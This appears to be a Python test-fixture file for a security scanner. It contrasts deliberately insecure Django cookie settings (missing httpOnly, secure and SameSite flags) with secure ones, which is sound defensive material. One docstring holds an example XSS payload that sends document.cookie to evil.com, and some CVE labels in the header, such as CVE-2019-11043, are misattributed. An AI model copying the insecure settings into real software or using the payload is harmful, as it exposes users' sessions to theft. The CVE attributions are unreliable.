"""
Cookie Security Fixtures

CVE-2020-8184: Session cookie theft via XSS
CVE-2019-11043: Cookie manipulation leading to XSS
CVE-2016-1000155: CSRF via missing SameSite attribute
"""

from django.http import HttpResponse

# ==================================================
# VULNERABLE: Missing httpOnly flag (CVE-2020-8184)
# ==================================================


def set_session_cookie_no_httponly_vulnerable(response, session_id: str):
    """
    ❌ HIGH: Missing httpOnly flag

    CVE-2020-8184: Without httpOnly, JavaScript can access cookies.
    XSS attacks can steal session cookies via document.cookie.

    Attack: <script>fetch('evil.com?c=' + document.cookie)</script>
    """
    response.set_cookie("session_id", session_id)
    return response


def set_session_cookie_httponly_false_vulnerable(response, session_id: str):
    """
    ❌ HIGH: Explicitly disabling httpOnly
    """
    response.set_cookie("session_id", session_id, httponly=False)
    return response


# ==================================================
# VULNERABLE: Missing secure flag
# ==================================================


def set_session_cookie_no_secure_vulnerable(response, session_id: str):
    """
    ❌ MEDIUM: Missing secure flag

    Without secure flag, cookies are sent over HTTP.
    Man-in-the-middle attacks can intercept session cookies.
    """
    response.set_cookie("session_id", session_id, httponly=True)
    return response


def set_session_cookie_secure_false_vulnerable(response, session_id: str):
    """
    ❌ MEDIUM: Explicitly allowing HTTP transmission
    """
    response.set_cookie("session_id", session_id, httponly=True, secure=False)  # Allows HTTP!
    return response


# ==================================================
# VULNERABLE: Missing SameSite (CVE-2016-1000155)
# ==================================================


def set_session_cookie_no_samesite_vulnerable(response, session_id: str):
    """
    ❌ MEDIUM: Missing SameSite attribute

    CVE-2016-1000155: Without SameSite, cookies are sent in
    cross-site requests, enabling CSRF attacks.
    """
    response.set_cookie("session_id", session_id, httponly=True, secure=True)
    return response


def set_session_cookie_samesite_none_vulnerable(response, session_id: str):
    """
    ❌ MEDIUM: SameSite=None without good reason

    SameSite=None allows cross-site requests.
    Only use if absolutely necessary (e.g., OAuth).
    """
    response.set_cookie("session_id", session_id, httponly=True, secure=True, samesite="None")
    return response


# ==================================================
# VULNERABLE: Combination of issues
# ==================================================


def set_remember_me_cookie_vulnerable(response, user_id: int):
    """
    ❌ CRITICAL: Multiple security issues

    - No httpOnly: XSS can steal
    - No secure: MITM can intercept
    - No SameSite: CSRF possible
    - Long expiration: Extended attack window
    """
    response.set_cookie("remember_me", str(user_id), max_age=30 * 24 * 60 * 60)  # 30 days
    return response


# ==================================================
# SECURE: All flags properly set
# ==================================================


def set_session_cookie_secure(response, session_id: str):
    """
    ✅ SECURE: All security flags enabled

    Best practices:
    - httpOnly=True: Prevents JavaScript access
    - secure=True: HTTPS only
    - samesite='Strict': Prevents CSRF
    - Short max_age: Limits exposure
    """
    response.set_cookie("session_id", session_id, httponly=True, secure=True, samesite="Strict", max_age=3600)  # 1 hour
    return response


def set_csrf_token_cookie_secure(response, csrf_token: str):
    """
    ✅ SECURE: CSRF token cookie

    Note: CSRF tokens need to be readable by JavaScript,
    so httpOnly=False is acceptable here.
    But still use secure and samesite!
    """
    response.set_cookie(
        "csrf_token",
        csrf_token,
        httponly=False,
        secure=True,
        samesite="Strict",
        max_age=3600,  # OK for CSRF tokens
    )
    return response


def set_session_cookie_lax_secure(response, session_id: str):
    """
    ✅ SECURE: SameSite=Lax for better UX

    Lax is less strict than Strict but still protects against CSRF.
    Good for sites that need to work with external links.
    """
    response.set_cookie("session_id", session_id, httponly=True, secure=True, samesite="Lax", max_age=3600)
    return response


# ==================================================
# Django examples
# ==================================================


def set_cookie_django_vulnerable(request):
    """
    ❌ HIGH: Django cookie without flags
    """
    response = HttpResponse("Welcome")
    response.set_cookie("session_id", "abc123")
    return response


def set_cookie_django_secure(request):
    """
    ✅ SECURE: Django cookie with all flags
    """
    response = HttpResponse("Welcome")
    response.set_cookie("session_id", "abc123", httponly=True, secure=True, samesite="Strict", max_age=3600)
    return response
